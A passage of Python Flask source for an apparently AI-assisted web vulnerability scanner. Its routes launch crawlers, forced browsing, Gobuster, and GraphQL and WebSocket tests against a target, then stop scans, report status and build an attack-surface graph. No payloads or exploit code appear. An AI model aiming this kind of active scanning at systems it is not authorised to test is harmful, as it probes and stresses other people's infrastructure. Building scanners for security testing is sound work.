        return redirect(url_for("index"))
    return render_template("login3.html")


@app.route("/")
@_login_required
def index():
    return render_template("index.html", csrf_token=_ensure_csrf_token())


@app.route("/api/scan/profiles")
@_login_required
def scan_profiles():
    """Return the list of pre-built scan profiles."""
    return jsonify({"profiles": _list_scan_profiles()})


@app.route("/api/scan/launch", methods=["POST"])
@_login_required
def scan_launch():
    global _scan_active, _scan_target, _SEM
    global _engine_stop_event, _engine_thread, _engine_running
    global _engine_sitemap, _engine_fuzz_results, _engine_fingerprint
    global _engine_status_msg, _engine_progress
    global _restored_scan_id

    data             = req.json or {}
    target           = data.get("target", "").strip()
    phases           = data.get("phases", PHASES)
    max_concurrent   = max(1, int(data.get("max_concurrent", 29)))
    profile_name     = data.get("profile", "").strip() or None
    scan_name        = _clean_scan_name(data.get("scan_name") or data.get("name") or "")
    skip_preflight   = bool(data.get("skip_preflight", False))
    max_duration_sec = int(data.get("max_duration_sec", 0))  # 0 = unlimited

    if not target:
        return jsonify({"success": False, "error": "target required"}), 400

    # Auto-resolve scheme/port — works for http, https, IP:port, etc.
    target = _resolve_target(target)

    # ── Gap 6: Pre-scan reachability check ───────────────────────────────────
    preflight: dict = {}
    if not skip_preflight:
        try:
            import requests as _pf_r, urllib3 as _pf_u3
            _pf_u3.disable_warnings()
            _pf_resp = _pf_r.get(target, timeout=8, verify=False, allow_redirects=True,
                                  headers={"User-Agent": "Mozilla/5.0 (DAST-Preflight/1.0)"})
            import re as _pf_re
            _title = (_pf_re.search(r'<title>([^<]{0,120})</title>',
                                     _pf_resp.text, _pf_re.I) or type('', (), {'group': lambda s, i: ''})()).group(1)
            preflight = {"ok": True, "status_code": _pf_resp.status_code,
                         "title": _title or "", "redirected_to": _pf_resp.url}
        except Exception as _pf_e:
            return jsonify({"success": False,
                            "error": f"target unreachable: {_pf_e}",
                            "preflight": {"ok": False}}), 422

    ai_mode = bool(_api_keys.get("openai") or _api_keys.get("anthropic"))

    # Reset state
    with _lock:
        _SEM = threading.Semaphore(max_concurrent)
        _agents.clear()
        _findings.clear()
        _passive_findings.clear()
        _context.clear()
        _seen_findings.clear()
        _grpc_scan_findings.clear()
        _grpc_scan_methods.clear()
        _wasm_scan_findings.clear()
        _tls_scan_findings.clear()
        _intruder_results.clear()
        _attack_chains.clear()
        _scan_active = True
        _scan_target = target
        _restored_scan_id = None
    try:
        _db_save_kv("attack_chains", [])
    except Exception:
        pass

    log.info("SCAN START target=%s profile=%s duration_budget=%ss",
             target, profile_name or "default", max_duration_sec or "∞")

    # Publish SCAN_STARTED + create persistent scan record
    global _active_scan_id
    _active_scan_id = get_store().create_scan(target)
    engine_meta = {"max_duration_sec": max_duration_sec, "profile": profile_name or "default"}
    if scan_name:
        engine_meta["scan_name"] = scan_name
    try:
        _db.start_scan(_active_scan_id, target, profile=profile_name or "default",
                       engine_meta=engine_meta)
    except Exception:
        pass

    # ── Gap 4: Audit scan launch ──────────────────────────────────────────────
    _db.log_audit("scan_launched", scan_id=_active_scan_id,
                  actor=session.get("user", "anonymous"), ip=req.remote_addr,
                  detail=f"target={target} profile={profile_name or 'default'}")

    # ── Gap 7: Scan time budget — hard-stop timer ─────────────────────────────
    if max_duration_sec > 0:
        def _budget_enforcer():
            import time as _bt
            _bt.sleep(max_duration_sec)
            if _scan_active and _active_scan_id:
                log.warning("SCAN TIMEOUT — budget of %ds exceeded for %s",
                            max_duration_sec, target)
                _engine_stop_event.set()
                try:
                    _db.complete_scan(_active_scan_id, status="timeout")
                    _db.log_audit("scan_timeout", scan_id=_active_scan_id,
                                  detail=f"budget={max_duration_sec}s exceeded")
                    safe_publish(SCAN_ERROR, {
                        "scan_id": _active_scan_id,
                        "target": target,
                        "reason": f"scan timeout: budget of {max_duration_sec}s exceeded",
                    })
                except Exception:
                    pass
        threading.Thread(target=_budget_enforcer, daemon=True,
                         name="scan-budget-timer").start()

    bus = get_global_bus()
    bus.subscribe(FINDING_DISCOVERED, _storage_finding_handler)
    bus.publish(SCAN_STARTED, {"target": target, "scan_id": _active_scan_id})

    # Register all agents up-front so the UI can show them immediately
    agent_ids = []
    for spec in _DAST_AGENTS:
        if spec["phase"] not in phases:
            continue
        aid = f"agent_{uuid.uuid4().hex[:8]}"
        state = {
            "id":           aid,
            "name":         spec["name"],
            "icon":         spec["icon"],
            "phase":        spec["phase"],
            "task":         spec["task"],
            "status":       "pending",
            "iteration":    0,
            "max_iter":     10,
            "commands_run": 0,
            "output":       [f"[{spec['name']}] Initialising for {target}..."],
            "findings":     [],
            "summary":      "",
            "created_at":   datetime.now(timezone.utc).isoformat(),
            "finished_at":  None,
            "stop":         False,
        }
        _agents[aid] = state
        agent_ids.append(aid)

    # Static mode (no API key): run all agents in parallel — context chain unused.
    # LLM mode: run sequentially so each agent's summary feeds the next.
    has_llm_key = bool(_api_keys.get("openai") or _api_keys.get("anthropic"))

    def _sequential_agent_runner(ids: list, tgt: str):
        accumulated_context = ""
        for _aid in ids:
            _st = _agents.get(_aid)
            if not _st or _st.get("stop"):
                break
            _agent_worker(_aid, tgt, prior_context=accumulated_context)
            _finished = _agents.get(_aid, {})
            _summary  = _finished.get("summary", "")
            _top_finds = "; ".join(
                f["text"] for f in _finished.get("findings", [])[:5] if f.get("text")
            )
            parts = []
            if _summary:
                parts.append(f"[{_finished.get('name',_aid)}] {_summary}")
            if _top_finds:
                parts.append(f"Findings: {_top_finds}")
            if parts:
                accumulated_context = (accumulated_context + "\n" + "\n".join(parts)).strip()

    def _parallel_agent_runner(ids: list, tgt: str):
        threads = []
        for _aid in ids:
            t = threading.Thread(
                target=_agent_worker, args=(_aid, tgt),
                daemon=True, name=f"dast-agent-{_aid}",
            )
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

    if has_llm_key:
        threading.Thread(
            target=_sequential_agent_runner, args=(agent_ids, target),
            daemon=True, name="dast-agent-sequencer",
        ).start()
    else:
        threading.Thread(
            target=_parallel_agent_runner, args=(agent_ids, target),
            daemon=True, name="dast-agent-parallel",
        ).start()

    # ── Also kick off the full engine pipeline (crawl→fuzz→OWASP) ──
    engine_started = False
    if _ENGINE_AVAILABLE:
        with _engine_lock:
            if not _engine_running:
                _engine_stop_event   = threading.Event()
                _engine_sitemap      = None
                _engine_fuzz_results = []
                _engine_fingerprint  = {}
                _engine_status_msg   = "starting"
                _engine_progress     = {
                    "phase":               "starting",
                    "pages_crawled":       0,
                    "current_url":         "",
                    "surfaces_found":      0,
                    "payloads_sent":       0,
                    "findings_count":      0,
                    "passive_count":       0,
                    "browse_count":        0,
                    "detected_url":        None,
                    "external_tools":      [],
                    "external_status":     "",
                    "nuclei_folder":       "",
                    "nuclei_folders_done": 0,
                    "nuclei_folders_total": 0,
                    "current_tool":        "",
                    "tools_ran_last_scan": [],
                    "race_findings":       0,
                    "race_tested":         0,
                    "race_total":          0,
                    "race_current_url":    "",
                    "biz_logic_findings":         0,
                    "bchecks_findings":           0,
                    "bchecks_count":              0,
                    "idor_findings":              0,
                    "source_discovery_endpoints": 0,
                    "websocket_findings":         0,
                    "graphql_findings":           0,
                    "saml_findings":              0,
                    "shadow_api_findings":        0,
                    "cache_poison_findings":      0,
                    "llm_scan_findings":          0,
                    "coverage_checks":            ["COV-REGISTRY-001"],
                }
                _engine_running = True
                # Build engine config — use profile if provided, else defaults
                if profile_name and profile_name in _SCAN_PROFILES:
                    _eng_cfg = _get_profile_config(profile_name)
                else:
                    _eng_cfg = {
                        "max_pages":    200,
                        "max_depth":    5,
                        "timeout":      10,
                        "delay":        0.05,
                        "max_per_type": 8,
                    }
                # Headless browser mode — routes engine session through Chromium
                _eng_cfg["use_headless_browser"] = bool(_api_keys.get("use_headless_browser", False))
                # Also stash phases_enabled so the worker can skip phases
                if profile_name and profile_name in _SCAN_PROFILES:
                    _eng_cfg["phases_enabled"] = _SCAN_PROFILES[profile_name]["phases_enabled"]
                    _eng_cfg["external_tools"] = _SCAN_PROFILES[profile_name]["external_tools"]

                # ── ScanPolicy: per-phase opt-out flags ───────────────────────
                # Callers can disable advanced phases via the request body, e.g.:
                #   {"target": "...", "policy": {"enable_bchecks": false}}
                # OR via top-level bool flags for backwards compat:
                #   {"target": "...", "enable_bchecks": false}
                _policy = data.get("policy") or {}
                _PHASE_FLAGS = {
                    "enable_biz_logic":        "biz_logic",
                    "enable_bchecks":          "bchecks",
                    "enable_source_discovery": "source_discovery",
                    "enable_websocket":        "websocket",
                    "enable_graphql":          "graphql",
                    "enable_idor_tests":       "idor_tests",
                    "enable_ua_diff":          "ua_diff",
                    "enable_api_race":         "api_race_testing",
                    "enable_saml":             "saml",
                    "enable_shadow_api":       "shadow_api",
                    "enable_cache_poison":     "cache_poison",
                }
                for flag, phase_name in _PHASE_FLAGS.items():
                    # Check policy dict first, fall back to top-level key
                    val = _policy.get(flag, data.get(flag, True))
                    if not val:
                        # Disabled — ensure phases_enabled exists and excludes this phase
                        if _eng_cfg.get("phases_enabled") is None:
                            # None means all enabled; materialise a full list first
                            _eng_cfg["phases_enabled"] = [
                                "crawl", "passive", "fingerprint", "deep_discovery",
                                "fuzz", "owasp_checks", "api_race_testing",
                                "ua_diff", "biz_logic", "bchecks", "idor_tests",
                                "source_discovery", "websocket", "graphql",
                                "saml", "shadow_api", "cache_poison", "llm_scan",
                                "external_tools", "post_processing",
                            ]
                        _eng_cfg["phases_enabled"] = [
                            p for p in _eng_cfg["phases_enabled"] if p != phase_name
                        ]

                # Stash optional source_path for SourceDiscovery
                if data.get("source_path"):
                    _eng_cfg["source_path"] = data["source_path"]
                _engine_thread = threading.Thread(
                    target=_engine_scan_worker,
                    args=(target, _eng_cfg),
                    daemon=True,
                    name="dast-engine",
                )
                _engine_thread.start()
                engine_started = True

    # ── Auto-launch all standalone scanners in parallel ───────────────────
    auto_started = []

    # 1. Traditional Spider
    global _spider
    if _spider is None or not _spider.is_running():
        _spider = _TraditionalSpider(
            target    = target,
            max_depth = 5,
            max_urls  = 250,
            scope     = "domain",
            timeout   = 10,
            session   = _engine_auth_handler.session if _engine_auth_handler else None,
        )
        _spider.start()
        _log_activity("spider_start", target)
        auto_started.append("spider")

    # 2. AJAX / Playwright Crawler
    global _ajax_running, _ajax_stop_event, _ajax_thread
    if _AJAX_SPIDER_AVAILABLE and not _ajax_running:
        _ajax_stop_event = threading.Event()
        _ajax_running    = True

        def _auto_ajax_worker():
            global _ajax_running, _ajax_urls_found, _ajax_pages
            try:
                from modules.ajax_spider import AjaxSpider
                from modules.scope import ScopeManager as _SM
                _auto_scope = _SM(target)
                spider = AjaxSpider(
                    target      = target,
                    scope       = _auto_scope,
                    stop_event  = _ajax_stop_event,
                    max_pages   = 150,
                    max_depth   = 4,
                )
                sitemap = spider.crawl()
                # spider.crawl() returns a SiteMap — convert pages dict to list of dicts
                pages = [
                    {
                        "url":          url,
                        "status":       info.get("status", 0),
                        "content_type": info.get("content_type", ""),
                        "title":        info.get("title", ""),
                        "source":       (
                            "websocket" if info.get("content_type") == "websocket"
                            else "network" if info.get("content_type") == "xhr/network"
                            else "browser"
                        ),
                    }
                    for url, info in sitemap.pages.items()
                ]
                with _engine_lock:
                    _ajax_urls_found = len(pages)
                    _ajax_pages      = pages
                log.info("[AutoScan] AJAX spider complete: %d pages discovered", len(pages))
            except Exception as e:
                log.warning("[AutoScan] AJAX crawler error: %s", e, exc_info=True)
            finally:
                _ajax_running = False

        _ajax_thread = threading.Thread(target=_auto_ajax_worker, daemon=True, name="dast-ajax-auto")
        _ajax_thread.start()
        auto_started.append("ajax_crawler")

    # 3. OAST listener — start early so all scanners can use out-of-band callbacks
    if _ENGINE_AVAILABLE:
        try:
            get_or_start_oast()
            auto_started.append("oast")
        except Exception as e:
            log.debug("[AutoScan] OAST start error: %s", e)

    # 4. GraphQL scan
    global _graphql_scan_running, _graphql_scan_findings, _graphql_scan_status, _graphql_scan_stop
    if _ENGINE_AVAILABLE and not _graphql_scan_running:
        _graphql_scan_running  = True
        _graphql_scan_findings = []
        _graphql_scan_status   = "starting"
        _graphql_scan_stop     = threading.Event()

        def _auto_gql_worker():
            global _graphql_scan_running, _graphql_scan_status
            try:
                from modules.graphql import GraphQLScanner
                scanner = GraphQLScanner(target=target, stop_event=_graphql_scan_stop, timeout=10)
                _graphql_scan_status = "running 12 security tests"
                results = scanner.scan()
                with _engine_lock:
                    _graphql_scan_findings.extend(results)
                for gf in results:
                    _record_finding(
                        agent="GraphQL Scanner", finding_text=gf.get("finding", ""),
                        severity=gf.get("severity", "medium"), target=gf.get("url", target),
                        agent_id="graphql", icon="🔮", phase="graphql_scan",
                        extra={"type": gf.get("vuln_type","graphql"), "proof": gf.get("proof",""),
                               "url": gf.get("url", target), "payload": gf.get("payload",""),
                               "param": gf.get("param","query"), "status_code": gf.get("status_code",0)},
                    )
                _graphql_scan_status = f"complete — {len(results)} findings"
            except Exception as e:
                _graphql_scan_status = f"error: {e}"
                log.debug("[AutoScan] GraphQL error: %s", e)
            finally:
                _graphql_scan_running = False

        threading.Thread(target=_auto_gql_worker, daemon=True, name="dast-graphql-auto").start()
        auto_started.append("graphql")

    # 5. WebSocket scan
    global _ws_scan_running, _ws_scan_findings, _ws_scan_status, _ws_scan_stop
    if _ENGINE_AVAILABLE and not _ws_scan_running:
        _ws_scan_running  = True
        _ws_scan_findings = []
        _ws_scan_status   = "starting"
        _ws_scan_stop     = threading.Event()

        def _auto_ws_worker():
            global _ws_scan_running, _ws_scan_status
            try:
                from modules.websocket import WebSocketScanner
                _auto_ws_auth: dict = {}
                if _engine_auth_handler:
                    _s = _engine_auth_handler.session
                    _av = _s.headers.get("Authorization", "")
                    if _av:
                        _auto_ws_auth["Authorization"] = _av
                    _ck = "; ".join(f"{c.name}={c.value}" for c in _s.cookies)
                    if _ck:
                        _auto_ws_auth["Cookie"] = _ck
                scanner = WebSocketScanner(
                    target=target, stop_event=_ws_scan_stop, timeout=5,
                    auth_headers=_auto_ws_auth or None,
                )
                _ws_scan_status = "running 13 security tests"
                results = scanner.scan()
                with _engine_lock:
                    _ws_scan_findings.extend(results)
                for wf in results:
                    _record_finding(
                        agent="WebSocket Scanner", finding_text=wf.get("finding", ""),
                        severity=wf.get("severity", "medium"), target=wf.get("url", target),
                        agent_id="websocket", icon="🔌", phase="websocket_scan",
                        extra={"type": wf.get("vuln_type","websocket"), "proof": wf.get("proof",""),
                               "url": wf.get("url", target), "payload": wf.get("payload",""),
                               "param": wf.get("param","frame"), "status_code": wf.get("status_code",0)},
                    )
                _ws_scan_status = f"complete — {len(results)} findings"
            except Exception as e:
                _ws_scan_status = f"error: {e}"
                log.debug("[AutoScan] WebSocket error: %s", e)
            finally:
                _ws_scan_running = False

        threading.Thread(target=_auto_ws_worker, daemon=True, name="dast-ws-auto").start()
        auto_started.append("websocket")

    # 6. Forcebrowse
    global _browse_running, _browse_stop_event, _browse_thread, _browse_results
    global _browse_wordlist_total, _browse_wordlist_label
    if _ENGINE_AVAILABLE and not _browse_running:
        _browse_stop_event = threading.Event()
        _browse_results    = []
        _browse_running    = True

        def _auto_browse_worker():
            global _browse_running, _browse_results, _browse_status
            global _browse_wordlist_total, _browse_wordlist_label
            try:
                sess = PassiveInterceptSession()
                sess.verify = False
                sess.headers["User-Agent"] = "Mozilla/5.0 (DAST-ForcedBrowse/2.0)"

                def _cb(result):
                    with _engine_lock:
                        _browse_results.append(result.to_dict())

                # Merge high-signal wordlists: curated micro list + targeted category lists
                merged = load_multiple_wordlists(
                    "olfa-micro",       # 37k OneListForAll curated paths
                    "proviesec-best",   # 701 hand-picked high-signal paths
                    "swagger",          # API doc endpoints (/swagger, /openapi, etc.)
                    "git",              # Git exposure paths (.git, etc.)
                    "docker",           # Docker/container paths
                    "phpinfo",          # PHP info pages
                    "phpmyadmin",       # phpMyAdmin paths
                    "grafana",          # Grafana dashboard paths
                    "log",              # Log file locations
                )
                _browse_wordlist_total = len(merged)
                _browse_wordlist_label = "auto high-signal"
                _browse_status = f"running - {len(merged)} paths scheduled"

                fb = ForcedBrowser(
                    base_url       = target,
                    session        = sess,
                    wordlist_name  = "",          # use extra_wordlist instead
                    extra_wordlist = merged,
                    workers        = 20,
                    timeout        = 8,
                    stop_event     = _browse_stop_event,
                    callback       = _cb,
                )
                fb.run()
                _browse_status = f"complete - {len(_browse_results)} paths found from {len(merged)} candidates"
            except Exception as e:
                log.debug("[AutoScan] Forcebrowse error: %s", e)
                _browse_status = f"error: {e}"
            finally:
                with _engine_lock:
                    _browse_running = False

        _browse_thread = threading.Thread(target=_auto_browse_worker, daemon=True, name="dast-forcebrowse-auto")
        _browse_thread.start()
        auto_started.append("forcebrowse")

    # 7. Gobuster — deep wordlist-based directory discovery
    global _gobuster_running, _gobuster_stop_event, _gobuster_thread, _gobuster_findings, _gobuster_status
    try:
        from modules.external_tools import GobusterRunner as _GobusterRunner
        _gobuster_available = _GobusterRunner.available()
    except Exception:
        _gobuster_available = False

    if _gobuster_available and not _gobuster_running:
        _gobuster_stop_event = threading.Event()
        _gobuster_findings   = []
        _gobuster_running    = True
        _gobuster_status     = "starting"

        def _auto_gobuster_worker():
            global _gobuster_running, _gobuster_findings, _gobuster_status
            try:
                from modules.external_tools import GobusterRunner

                def _gb_progress(msg: str):
                    global _gobuster_status
                    _gobuster_status = msg

                findings = GobusterRunner.run(
                    target        = target,
                    wordlist_name = "olfa-micro",   # 37k curated — fast initial pass
                    threads       = 50,
                    stop_event    = _gobuster_stop_event,
                    on_progress   = _gb_progress,
                )
                with _engine_lock:
                    _gobuster_findings.extend(findings)
                _gobuster_status = f"complete — {len(findings)} paths discovered"
            except Exception as e:
                _gobuster_status = f"error: {e}"
                log.warning("[AutoScan] Gobuster error: %s", e)
            finally:
                with _engine_lock:
                    _gobuster_running = False

        _gobuster_thread = threading.Thread(target=_auto_gobuster_worker, daemon=True, name="dast-gobuster-auto")
        _gobuster_thread.start()
        auto_started.append("gobuster")

    return jsonify({
        "success":           True,
        "target":            target,
        "scan_id":           _active_scan_id,
        "scan_name":         _scan_history_identifier(_active_scan_id, datetime.now(timezone.utc).isoformat(), scan_name),
        "agent_ids":         agent_ids,
        "count":             len(agent_ids),
        "phases":            phases,
        "ai_mode":           ai_mode,
        "profile":           profile_name,
        "engine":            "started" if engine_started else "skipped (already running or unavailable)",
        "auto_started":      auto_started,
        "preflight":         preflight,
        "max_duration_sec":  max_duration_sec,
    })


@app.route("/api/scan/stop", methods=["POST"])
@_login_required
def scan_stop():
    global _scan_active
    with _lock:
        for agent in _agents.values():
            agent["stop"] = True
        _scan_active = False
    # Stop engine pipeline
    if _engine_stop_event is not None:
        _engine_stop_event.set()
    # Stop all auto-launched standalone scanners
    if _spider and _spider.is_running():
        _spider.stop()
    if _ajax_stop_event is not None:
        _ajax_stop_event.set()
    if _graphql_scan_stop is not None:
        _graphql_scan_stop.set()
    if _ws_scan_stop is not None:
        _ws_scan_stop.set()
    if _browse_stop_event is not None:
        _browse_stop_event.set()
    if _gobuster_stop_event is not None:
        _gobuster_stop_event.set()
    return jsonify({"success": True})


@app.route("/api/scan/status")
@_login_required
def scan_status():
    with _lock:
        agents_list = list(_agents.values())
        security_findings = _main_security_findings(_findings)
        findings = len(security_findings)
        unique_findings = _group_findings(security_findings)["count"] if security_findings else 0
    total    = len(agents_list)
    running  = sum(1 for a in agents_list if a["status"] == "running")
    pending  = sum(1 for a in agents_list if a["status"] == "pending")
    done     = sum(1 for a in agents_list if a["status"] in ("completed", "error", "stopped"))

    agents_out = []
    for a in agents_list:
        agents_out.append({
            "id":           a["id"],
            "name":         a["name"],
            "icon":         a["icon"],
            "phase":        a["phase"],
            "status":       a["status"],
            "iteration":    a["iteration"],
            "commands_run": a["commands_run"],
            "findings_count": len(a["findings"]),
            "summary":      a["summary"],
            "finished_at":  a["finished_at"],
        })

    # Engine pipeline state
    with _engine_lock:
        eng_running      = _engine_running
        eng_status       = _engine_status_msg
        eng_progress     = dict(_engine_progress)
        _ajax_urls_snap  = _ajax_urls_found

    return jsonify({
        "scan_active":    _scan_active or eng_running,
        "target":         _scan_target,
        "total":          total,
        "running":        running,
        "pending":        pending,
        "done":           done,
        "findings":       findings,
        "raw_findings":   findings,
        "unique_findings": unique_findings,
        "agents":         agents_out,
        "engine": {
            "running":    eng_running,
            "status":     eng_status,
            "phase":      eng_progress.get("phase", "idle"),
            "pages_crawled":  eng_progress.get("pages_crawled", 0),
            "current_url":    eng_progress.get("current_url", ""),
            "ajax_pages":     _ajax_urls_snap,
            "surfaces_found":  eng_progress.get("surfaces_found", 0),
            "surfaces_done":   eng_progress.get("surfaces_done", 0),
            "surfaces_total":  eng_progress.get("surfaces_total", 0),
            "payloads_sent":   eng_progress.get("payloads_sent", 0),
            "passive_done":    eng_progress.get("passive_done", 0),
            "passive_total":   eng_progress.get("passive_total", 0),
            "passive_pct":     eng_progress.get("passive_pct", 0),
            "findings_count": eng_progress.get("findings_count", 0),
            "external_tools": eng_progress.get("external_tools", []),
            "external_status": eng_progress.get("external_status", ""),
            "nuclei_folder": eng_progress.get("nuclei_folder", ""),
            "nuclei_folders_done": eng_progress.get("nuclei_folders_done", 0),
            "nuclei_folders_total": eng_progress.get("nuclei_folders_total", 0),
            "current_tool": eng_progress.get("current_tool", ""),
            "tools_ran_last_scan":  eng_progress.get("tools_ran_last_scan", []),
            "attack_chains":       eng_progress.get("attack_chains", 0),
            "race_findings":       eng_progress.get("race_findings", 0),
            "race_tested":         eng_progress.get("race_tested", 0),
            "race_total":          eng_progress.get("race_total", 0),
            "race_current_url":    eng_progress.get("race_current_url", ""),
            "biz_logic_findings":         eng_progress.get("biz_logic_findings", 0),
            "bchecks_findings":           eng_progress.get("bchecks_findings", 0),
            "bchecks_count":              eng_progress.get("bchecks_count", 0),
            "idor_findings":              eng_progress.get("idor_findings", 0),
            "source_discovery_endpoints": eng_progress.get("source_discovery_endpoints", 0),
            "websocket_findings":         eng_progress.get("websocket_findings", 0),
            "graphql_findings":           eng_progress.get("graphql_findings", 0),
            "saml_findings":              eng_progress.get("saml_findings", 0),
            "shadow_api_findings":        eng_progress.get("shadow_api_findings", 0),
            "cache_poison_findings":      eng_progress.get("cache_poison_findings", 0),
            "llm_scan_findings":          eng_progress.get("llm_scan_findings", 0),
        },
        "last_scan": _last_scan_summary if _last_scan_summary else None,
        "dirscan": {
            "forcebrowse_running": _browse_running,
            "forcebrowse_status":  _browse_status,
            "forcebrowse_found":   len(_browse_results),
            "forcebrowse_wordlist_size": _browse_wordlist_total,
            "forcebrowse_wordlist": _browse_wordlist_label,
            "gobuster_running":    _gobuster_running,
            "gobuster_status":     _gobuster_status,
            "gobuster_found":      len(_gobuster_findings),
        },
    })


@app.route("/api/agent/<aid>/output")
@_login_required
def agent_output(aid: str):
    agent = _agents.get(aid)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404
    after = int(req.args.get("after", 0))
    tail  = int(req.args.get("tail",  0))
    lines = agent["output"]
    slice = lines[after:] if not tail else lines[-tail:]
    return jsonify({
        "lines":          slice,
        "after":          len(lines),
        "status":         agent["status"],
        "iteration":      agent["iteration"],
        "commands_run":   agent["commands_run"],
        "findings_count": len(agent["findings"]),
    })


@app.route("/api/agent/<aid>/stop", methods=["POST"])
@_login_required
def agent_stop(aid: str):
    agent = _agents.get(aid)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404
    agent["stop"] = True
    agent["status"] = "stopped"
    return jsonify({"success": True})


@app.route("/api/graph-data")
@_login_required
def graph_data():
    """
    Return attack-surface graph data for the DAST graph visualiser.

    Graph structure:
      Nodes: host (root) → path segments → endpoints → findings
      Edges: containment (host→path, path→endpoint) + vulnerability (endpoint→finding)

    Query params:
      min_severity  — filter finding nodes: critical | high | medium | low | info
      include_clean — "1" to include endpoints with no findings (default "1")
    """
    min_sev_raw    = (req.args.get("min_severity") or "info").lower()
    include_clean  = req.args.get("include_clean", "1") != "0"
    SEV_RANK       = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    min_sev_rank   = SEV_RANK.get(min_sev_raw, 4)

    # Merge ALL findings sources: agent findings + engine fuzzer + passive scanner + port scan
    with _lock:
        agent_findings = _main_security_findings(_findings)
    with _engine_lock:
        sitemap_snap     = dict(_engine_sitemap.pages) if _engine_sitemap else {}
        engine_findings  = list(_engine_fuzz_results)
        ajax_urls        = [p.get("url", "") for p in _ajax_pages if p.get("url")]
    passive_findings = list(_passive_findings)
    port_findings    = list(_port_scan_findings)

    # Combine — deduplicate by (url, vuln_type, finding[:80])
    seen_dedup: set[str] = set()
    findings_snap: list[dict] = []
    for f in (agent_findings + engine_findings + passive_findings + port_findings):
        url = f.get("url") or f.get("target") or ""
        vt  = f.get("vuln_type") or f.get("type") or f.get("category") or "unknown"
        key = f"{url}|{vt}|{str(f.get('finding',''))[:80]}"
        if key not in seen_dedup:
            seen_dedup.add(key)
            findings_snap.append(f)

    target_raw = _scan_target or "unknown"
    from urllib.parse import urlparse as _urlparse
    parsed_target = _urlparse(target_raw if "://" in target_raw else f"https://{target_raw}")
    host = parsed_target.netloc or target_raw

    SEV_COLOR = {
        "critical": "#dc2626",
        "high":     "#ea580c",
        "medium":   "#2563eb",
        "low":      "#16a34a",
        "info":     "#6366f1",
    }

    nodes: dict[str, dict] = {}
    edges: list[dict] = []
    _edge_set: set[tuple] = set()

    def _add_node(nid: str, **kw) -> None:
        if nid not in nodes:
            nodes[nid] = {"id": nid, **kw}

    def _add_edge(src: str, tgt: str, **kw) -> None:
        key = (src, tgt)
        if key not in _edge_set:
            _edge_set.add(key)
            edges.append({"source": src, "target": tgt, **kw})

    # Root: target host
    _add_node("__host__", label=host, type="host", group="host",
              color="#0f172a", size=28, detail={"url": target_raw})

    # Build endpoint nodes from sitemap + findings + AJAX-discovered pages
    endpoint_urls: set[str] = set()
    for url in sitemap_snap:
        endpoint_urls.add(url)
    for f in findings_snap:
        u = f.get("url") or f.get("target") or ""
        if u:
            endpoint_urls.add(u)
    for url in ajax_urls:
        if url:
            endpoint_urls.add(url)

    # endpoint → findings index
    endpoint_findings: dict[str, list[dict]] = {}
    for f in findings_snap:
        u = f.get("url") or f.get("target") or ""
        if u:
            endpoint_findings.setdefault(u, []).append(f)

    for url in endpoint_urls:
        try:
            p = _urlparse(url)
            path = p.path or "/"
        except Exception:
            path = "/"

        # Build intermediate path segment nodes
        segments = [s for s in path.split("/") if s]
        prev_id = "__host__"
        for depth, seg in enumerate(segments[:-1], 1):
            seg_id = f"__path__{'/'.join(segments[:depth])}"
            _add_node(seg_id, label=f"/{seg}", type="path", group="path",
                      color="#64748b", size=10,
                      detail={"path": "/" + "/".join(segments[:depth])})
            _add_edge(prev_id, seg_id, type="contains", color="#cbd5e1")
            prev_id = seg_id

        # Endpoint node
        ep_id = f"__ep__{url}"
        flist = endpoint_findings.get(url, [])
        worst_sev = "info"
        for wf in flist:
            s = (wf.get("severity") or "info").lower()
            if SEV_RANK.get(s, 4) < SEV_RANK.get(worst_sev, 4):
                worst_sev = s

        if not include_clean and not flist:
            continue

        ep_color = SEV_COLOR.get(worst_sev, "#94a3b8") if flist else "#94a3b8"
        ep_label = segments[-1] if segments else "/"
        _add_node(ep_id, label=ep_label, type="endpoint", group="endpoint",
                  color=ep_color, size=14 if not flist else 18,
                  has_findings=bool(flist), worst_severity=worst_sev,
                  detail={"url": url, "findings": len(flist),
                          "status": sitemap_snap.get(url, {}).get("status_code") if isinstance(sitemap_snap.get(url), dict) else None})
        _add_edge(prev_id, ep_id, type="contains", color="#cbd5e1")

        # Finding nodes — one per unique vuln_type at this endpoint
        seen_vtypes: set[str] = set()
        for f in flist:
            sev = (f.get("severity") or "info").lower()
            if SEV_RANK.get(sev, 4) > min_sev_rank:
                continue
            vt = (f.get("vuln_type") or f.get("type") or "unknown").lower()
            fnode_id = f"__finding__{url}__{vt}"
            if fnode_id in seen_vtypes:
                continue
            seen_vtypes.add(fnode_id)
            color = SEV_COLOR.get(sev, "#6366f1")
            _add_node(fnode_id, label=vt.replace("_", " "),
                      type="finding", group="finding",
                      color=color, size=10,
                      detail={"vuln_type": vt, "severity": sev,
                               "finding": (f.get("finding") or "")[:200],
                               "url": url,
                               "param": f.get("param", ""),
                               "cwe": f.get("cwe", "")})
            _add_edge(ep_id, fnode_id, type="vulnerable_to", color=color)

    # Port scan findings — synthesise host:port endpoint nodes (no URL path)
    for pf in port_findings:
        h = pf.get("host") or host
        port = pf.get("port")
        if not port:
            continue
        sev = (pf.get("severity") or "info").lower()
        if SEV_RANK.get(sev, 4) > min_sev_rank:
            continue
        port_ep_id = f"__port__{h}:{port}"
        service = pf.get("service") or "port"
        _add_node(port_ep_id, label=f":{port}/{service}", type="endpoint",
                  group="port", color=SEV_COLOR.get(sev, "#94a3b8"), size=16,
                  has_findings=True, worst_severity=sev,
                  detail={"host": h, "port": port, "service": service,
                          "finding": (pf.get("finding") or "")[:200],
                          "cwe": pf.get("cwe", "")})
        _add_edge("__host__", port_ep_id, type="exposes_port", color=SEV_COLOR.get(sev, "#94a3b8"))
        fnode_id = f"__finding__{h}:{port}__open_port"
        _add_node(fnode_id, label=f"{service} open",
                  type="finding", group="finding",
                  color=SEV_COLOR.get(sev, "#6366f1"), size=10,
                  detail={"vuln_type": "open_port", "severity": sev,
                          "finding": (pf.get("finding") or "")[:200],
                          "cwe": pf.get("cwe", "")})
        _add_edge(port_ep_id, fnode_id, type="vulnerable_to", color=SEV_COLOR.get(sev, "#6366f1"))

    # Stats — include port findings in sev counts
    sev_counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in (findings_snap + port_findings):
        s = (f.get("severity") or "info").lower()
        sev_counts[s] = sev_counts.get(s, 0) + 1

    total_findings = len(findings_snap) + len(port_findings)
    return jsonify({
